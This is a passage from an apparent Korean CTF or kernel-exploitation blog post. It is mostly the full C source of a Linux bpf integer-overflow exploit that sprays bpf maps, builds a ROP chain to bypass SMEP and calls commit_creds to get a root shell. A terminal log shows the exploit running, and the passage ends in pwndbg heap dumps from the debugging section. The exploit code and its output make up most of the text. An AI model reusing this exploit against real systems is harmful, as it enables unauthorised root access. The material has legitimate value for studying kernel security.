class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -o exp exp.c -static -fno-pie</span></span><br><span class="line"><span class="comment">// This is a SMEP bypass exploit against a integer overflow vulnerability</span></span><br><span class="line"><span class="comment">// in Linux kernel bpf module</span></span><br><span class="line"><span class="comment">// The offset used in this exploit is against a custom compiled kernel.</span></span><br><span class="line"><span class="comment">// exploit author: Wei Wu (ww9210@gmail.com)</span></span><br><span class="line"><span class="comment">// initial poc generated by syzkaller</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   user@syzkaller:~$ ./exp</span></span><br><span class="line"><span class="comment">   rop_payload_initialized</span></span><br><span class="line"><span class="comment">   uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:kernel_t:s0</span></span><br><span class="line"><span class="comment"># uname -a</span></span><br><span class="line"><span class="comment">Linux syzkaller 4.20.0-rc3 #1 SMP Thu Nov 22 15:12:38 CST 2018 x86_64 GNU/Linux</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_NUMBER 14</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;endian.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> native_write_cr4 0xffffffff810037d5<span class="comment">// 0xffffffff81097fcc</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POPRDX 0xffffffff81002dda</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DUMMY 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREPARE_KERNEL_CRED 0xFFFFFFFF810E3D40 <span class="comment">//0xffffffff810e3670</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS  0xFFFFFFFF810E3AB0 <span class="comment">//0xffffffff810e33e0</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> poprdiret 0xffffffff810013b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> popraxret 0xffffffff81029c71</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs 0xffffffff81c00d5a<span class="comment">//0xffffffff81c0095f</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> iretq 0xffffffff8106d8f4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stack_pivot_gadget 0xffffffff81954dc8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stack_top_offset 0x674</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> krop_base_to_map 0x81954000</span></span><br><span class="line"><span class="keyword">int</span> rop_start=<span class="number">0x1444</span><span class="number">-8</span>;</span><br><span class="line"><span class="keyword">void</span>* krop_base_mapped;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">            <span class="string">"movq %%cs, %0\n"</span></span><br><span class="line">            <span class="string">"movq %%ss, %1\n"</span></span><br><span class="line">            <span class="string">"pushfq\n"</span></span><br><span class="line">            <span class="string">"popq %2\n"</span></span><br><span class="line">            : <span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_rflags)</span><br><span class="line">            :</span><br><span class="line">            : <span class="string">"memory"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"id"</span>);</span><br><span class="line">    <span class="keyword">char</span> *shell = <span class="string">"/bin/sh"</span>;</span><br><span class="line">    <span class="keyword">char</span> *args[] = &#123;shell, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(shell, args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"></span><br><span class="line">_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root_payload</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> rop_chain[] = &#123;</span><br><span class="line">    popraxret,</span><br><span class="line">    <span class="number">0x6f0</span>,</span><br><span class="line">    <span class="number">0xffffffff81001c51</span>,<span class="comment">//native_write_cr4,</span></span><br><span class="line">    poprdiret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    PREPARE_KERNEL_CRED,</span><br><span class="line">    <span class="number">0xffffffff81001c50</span>, <span class="comment">//: pop rsi ; ret</span></span><br><span class="line">    poprdiret,</span><br><span class="line">    <span class="number">0xffffffff81264e0b</span>,<span class="comment">//: push rax; push rsi; ret; //0xffffffff812646fb, //: push rax ; push rsi ; ret</span></span><br><span class="line">    COMMIT_CREDS,</span><br><span class="line">    swapgs,</span><br><span class="line">    <span class="number">0x246</span>,</span><br><span class="line">    iretq,</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)&amp;get_shell,</span><br><span class="line">    <span class="number">0</span>,<span class="comment">//user_cs,</span></span><br><span class="line">    <span class="number">0</span>,<span class="comment">//user_rflags,</span></span><br><span class="line">    <span class="number">0</span>,<span class="comment">//krop_base_mapped + 0x4000,</span></span><br><span class="line">    <span class="number">0</span><span class="comment">//user_ss</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> * fakestack;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_krop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    krop_base_mapped=mmap((<span class="keyword">void</span> *)krop_base_to_map,<span class="number">0x8000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (krop_base_mapped&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">"mmap failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fakestack=mmap((<span class="keyword">void</span> *)<span class="number">0xa000000000</span>,<span class="number">0x8000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="number">0x0000000081954dc8</span>=popraxret;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)krop_base_to_map = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x1000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x2000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x3000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x4000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x5000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x6000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x7000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x4000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x3000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x2000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x1000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x10</span>) = stack_pivot_gadget;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x7000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x6000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x5000</span>) = <span class="number">0</span>;</span><br><span class="line">    rop_chain[<span class="number">12</span>+<span class="number">2</span>]=user_cs;</span><br><span class="line">    rop_chain[<span class="number">13</span>+<span class="number">2</span>]=user_rflags;</span><br><span class="line">    rop_chain[<span class="number">14</span>+<span class="number">2</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(fakestack + <span class="number">0x6000</span>);</span><br><span class="line">    rop_chain[<span class="number">15</span>+<span class="number">2</span>]=user_ss;</span><br><span class="line">    <span class="built_in">memcpy</span>(krop_base_mapped+rop_start,rop_chain,<span class="keyword">sizeof</span>(rop_chain));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"rop_payload_initialized"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_bpf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bpf 321</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> r[<span class="number">1</span>] = &#123;<span class="number">0xffffffffffffffff</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defragmentation</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">defragment</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    FILE* fp;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">200</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(name, <span class="number">100</span>, <span class="string">"xxx%d"</span>, i);</span><br><span class="line">        fp=fopen(name,<span class="string">"w"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> victim[SPRAY_NUMBER];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;SPRAY_NUMBER;i++)&#123;</span><br><span class="line">        victim[i] = syscall(__NR_bpf, <span class="number">0</span>, <span class="number">0x200011c0</span>, <span class="number">0x2c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell_again</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"SIGSEGV found"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"get shell again"</span>);</span><br><span class="line">    system(<span class="string">"id"</span>);</span><br><span class="line">    <span class="keyword">char</span> *shell = <span class="string">"/bin/sh"</span>;</span><br><span class="line">    <span class="keyword">char</span> *args[] = &#123;shell, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(shell, args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    signal(SIGSEGV,get_shell_again);</span><br><span class="line">    <span class="comment">//get_shell();</span></span><br><span class="line">    syscall(__NR_mmap, <span class="number">0x20000000</span>, <span class="number">0x1000000</span>, <span class="number">3</span>, <span class="number">0x32</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">long</span> res = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011c0</span> = <span class="number">0x17</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011c4</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011c8</span> = <span class="number">0x40</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011cc</span> = <span class="number">-1</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011d0</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011d4</span> = <span class="number">-1</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011d8</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011dc</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011dd</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011de</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011df</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e0</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e1</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e2</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e3</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e4</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e5</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e6</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e7</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e8</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e9</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011ea</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011eb</span> = <span class="number">0</span>;</span><br><span class="line">    save_state();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"user_cs:%llx   user_ss: %llx\n"</span>,user_cs,user_ss);</span><br><span class="line">    prepare_krop();</span><br><span class="line">    res = syscall(__NR_bpf, <span class="number">0</span>, <span class="number">0x200011c0</span>, <span class="number">0x2c</span>);</span><br><span class="line">    <span class="keyword">if</span> (res != <span class="number">-1</span>)</span><br><span class="line">        r[<span class="number">0</span>] = res;</span><br><span class="line">    spray();</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)<span class="number">0x200000c0</span> = r[<span class="number">0</span>];</span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)<span class="number">0x200000c8</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)<span class="number">0x200000d0</span> = <span class="number">0x20000140</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)<span class="number">0x200000d8</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span>* ptr = (<span class="keyword">uint64_t</span>*)<span class="number">0x20000140</span>;</span><br><span class="line">    ptr[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    ptr[<span class="number">1</span>]=<span class="number">2</span>;</span><br><span class="line">    ptr[<span class="number">2</span>]=<span class="number">3</span>;</span><br><span class="line">    ptr[<span class="number">3</span>]=<span class="number">4</span>;</span><br><span class="line">    ptr[<span class="number">4</span>]=<span class="number">5</span>;</span><br><span class="line">    ptr[<span class="number">5</span>]=<span class="number">6</span>;</span><br><span class="line">    ptr[<span class="number">6</span>]=<span class="number">0xa000000000</span>;</span><br><span class="line">    ptr[<span class="number">7</span>]=<span class="number">8</span>;</span><br><span class="line">    syscall(__NR_bpf, <span class="number">2</span>, <span class="number">0x200000c0</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x7000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x6000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x5000</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;SPRAY_NUMBER;i++)&#123;</span><br><span class="line">        close(victim[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//pause();</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/ $ id</span><br><span class="line">uid=1000(chal) gid=1000(chal) groups=1000(chal)</span><br><span class="line">/ $ ./exp</span><br><span class="line">user_cs:33   user_ss: 2b</span><br><span class="line">rop_payload_initialized</span><br><span class="line">SIGSEGV found</span><br><span class="line">get shell again</span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">/ <span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="debugging"><a href="#debugging" class="headerlink" title="debugging"></a>debugging</h3><p>bpf 맵을 할당하게 되는 <code>bpf_map_area_alloc()</code> 함수에 break를 걸고 리턴 주소를 확인한 뒤, heap overflow 전 후의 해당 주소의 데이터를 비교해본 결과입니다.</p><p>첫 번째(fd 3) bpf 맵의 주소가 <code>0xffff88807f510300</code> 인 상황입니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/100gx 0xffff88807f510300</span><br><span class="line">0xffff88807f510300:0xffffffff82029ba00x0000000000000000     // fd = 3</span><br><span class="line">0xffff88807f510310:0xffff888079b06f000x0000000000000017</span><br><span class="line">0xffff88807f510320:0xffffffff000000400x0000000100000000</span><br><span class="line">0xffff88807f510330:0xffffffff000000100x0000000000000000</span><br><span class="line">0xffff88807f510340:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f510350:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f510360:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f510370:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f510380:0xffff88807fad8b000x0000000100000001</span><br><span class="line">0xffff88807f510390:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f5103a0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f5103b0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f5103c0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f5103d0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f5103e0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f5103f0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f510400:0xffffffff82029ba00x0000000000000000     // fd = 7</span><br><span class="line">0xffff88807f510410:0xffff888079b06f680x0000000000000017</span><br><span class="line">0xffff88807f510420:0xffffffff000000400x0000000100000000</span><br><span class="line">0xffff88807f510430:0xffffffff000000140x0000000000000000</span><br><span class="line">0xffff88807f510440:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f510450:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f510460:0x00000000000000000x0000000000000000</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>heap overflow가 일어나기 전의 데이터 상황입니다. 첫 번째(fd 3) 맵과 인접하게 할당된 fd 7 맵의 첫 번째 멤버가 0xffffffff82029ba0 인 것을 확인할 수 있습니다.</p><figure class="highlight bash"><table><tr><td 